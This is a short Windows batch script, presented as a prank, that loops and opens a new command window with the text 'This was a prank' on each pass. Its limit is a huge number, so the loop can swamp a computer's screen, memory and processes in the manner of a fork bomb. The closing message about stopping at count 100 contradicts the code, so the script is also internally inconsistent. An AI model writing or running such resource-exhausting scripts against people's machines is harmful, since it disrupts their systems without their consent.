@echo off
set count=0

:loopstart
set /a count+=1

start cmd /k echo This was a prank

if %count% lss 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (
    goto loopstart
) else (
    echo Loop completed at count 100.
)
